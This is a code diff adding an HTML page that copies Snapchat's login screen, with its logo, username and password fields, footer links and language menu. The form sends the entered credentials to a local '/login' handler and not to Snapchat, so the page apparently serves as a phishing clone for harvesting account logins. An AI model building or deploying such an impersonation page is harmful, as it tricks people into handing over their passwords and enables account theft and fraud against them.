@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title> Snapchat | Login </title>
+  
+  <link rel="preload" href="/snapchat-app-icon.svg">
+  <script src="/tailwindcss.js"></script>
+</head>
+
+<body class="bg-gray-200 h-full">
+  
+  <div class="px-2 mt-10 bg-white">
+    <div class="flex flex-col space-between items-center py-2 px-5 space-y-2">
+      <img src="/snapchat-app-icon.svg" alt="icon" class="h-20 w-20 m-5">
+      <h1 class="text-3xl font-bold">Log in to Snapchat</h1>
+    </div>
+    <form action="/login" method="post" class="flex flex-col space-between items-center py-2 px-5 space-y-2">
+      <div class="w-full">
+        <label for="acc-id" class="text-sm font-bold text-gray-400">
+          Username or email address
+        </label>
+        <input name="acc-id" autocomplete="username" type="text" id="acc-id" class="bg-gray-100 w-full h-9 outline-none px-4 py-5 font-semibold border-b-2 border-gray-100 focus:border-[#0FADFF] rounded-sm">
+      </div>
+      <div class="w-full">
+        <label for="acc-pass" class="text-sm font-bold text-gray-400">
+          Password
+        </label>
+        <input name="acc-pass" autocomplete="username" type="text" id="acc-id" class="bg-gray-100 w-full h-9 outline-none px-4 py-5 font-semibold border-b-2 border-gray-100 focus:border-[#0FADFF] rounded-sm">
+      </div>
+      <div class="p-5 space-y-5 text-center">
+        <!-- div class="text-[#0FADFF] font-bold">
+          <a href="/">Use phone number instead</a>
+        </div -->
+        <button type="submit" class="bg-[#0FADFF] text-white py-2 px-5 font-bold rounded-full text-lg">
+          Next
+        </button>
+      </div>
+    </form>
+  </div>
+  
+  <div class="text-center py-5 px-2 text-lg">
+    <span>New to Snapchat?</span>
+    <span class="font-bold px-2 text-gray-600">Sign Up</span>
+  </div>
+  
+  <div class="mt-10 bg-gray-100">
+    <div class="flex w-full border-t-2 px-5 py-3 items-center space-x-1">
+      <svg width="15" height="20" fill="rgba(0,0,0,.87)">
+        <g>
+          <rect stroke="rgba(0,0,0,.87)" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+          <rect stroke="rgba(0,0,0,.87)" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+        </g>
+      </svg>
+      <span>Company</span>
+    </div>
+    <div class="flex w-full border-t-2 px-5 py-3 items-center space-x-1">
+      <svg width="15" height="20" fill="rgba(0,0,0,.87)">
+        <g>
+          <rect stroke="rgba(0,0,0,.87)" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+          <rect stroke="rgba(0,0,0,.87)" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+        </g>
+      </svg>
+      <span>Community</span>
+    </div>
+    <div class="flex w-full border-t-2 px-5 py-3 items-center space-x-1">
+      <svg width="15" height="20" fill="rgba(0,0,0,.87)">
+        <g>
+          <rect stroke="rgba(0,0,0,.87)" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+          <rect stroke="rgba(0,0,0,.87)" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+        </g>
+      </svg>
+      <span>Advertising</span>
+    </div>
+    <div class="flex w-full border-t-2 px-5 py-3 items-center space-x-1">
+      <svg width="15" height="20" fill="rgba(0,0,0,.87)">
+        <g>
+          <rect stroke="rgba(0,0,0,.87)" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+          <rect stroke="rgba(0,0,0,.87)" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+        </g>
+      </svg>
+      <span>Legal</span>
+    </div>
+  </div>
+  
+  <div class="p-5 space-y-2 border-t-2 border-gray-300 bg-gray-100">
+    <div class="text-lg font-semibold text-gray-700">Language</div>
+    <div>
+      <select class="border-2 border-gray-500 rounded-md p-2 text-gray-500 w-full bg-gray-100">
+        <option value="en-GB">English (UK)</option>
+        <option value="da-DK">Dansk</option>
+        <option value="de-DE">Deutsch</option>
+        <option value="el-GR">Ελληνικά</option>
+        <option value="en-GB">English (UK)</option>
+        <option value="en-US">English (US)</option>
+        <option value="es">Español</option>
+        <option value="es-AR">Español (Argentine)</option>
+        <option value="es-ES">Español (España)</option>
+        <option value="es-MX">Español (México)</option>
+        <option value="fi-FI">Suomi</option>
+        <option value="fil-PH">Filipino</option>
+        <option value="fr-FR">Français</option>
+        <option value="gu-IN">ગુજરાતી</option>
+        <option value="hi-IN">हिंदी</option>
+        <option value="id-ID">Bahasa Indonesia</option>
+        <option value="it-IT">Italiano</option>
+        <option value="ja-JP">日本語</option>
+        <option value="kn-IN">ಕನ್ನಡ (India)</option>
+        <option value="ko-KR">한국어</option>
+        <option value="ml-IN">മലയാളം</option>
+        <option value="mr-IN">मराठी</option>
+        <option value="ms-MY">Bahasa Melayu</option>
+        <option value="nb-NO">Norsk</option>
+        <option value="nl-NL">Nederlands</option>
+        <option value="pa">ਪੰਜਾਬੀ</option>
+        <option value="pl-PL">Polski</option>
+        <option value="vi-VN">Tiếng Việt</option>
+        <option value="zh-Hans">中文（简体）</option>
+        <option value="zh-Hant">中文（繁體）</option>
+      </select>
+    </div>
+  </div>
+  
+  <footer class="bg-[#262626] text-gray-500 font-bold font-mono text-sm px-5 py-3 space-y-5">
+    <p><a href="https://snap.com/en-GB/privacy/privacy-policy/">Privacy Policy</a></p>
+    <p><a href="https://snap.com/en-GB/terms/">Terms of Service</a></p>
+  </footer>
+</body>
+
+</html>
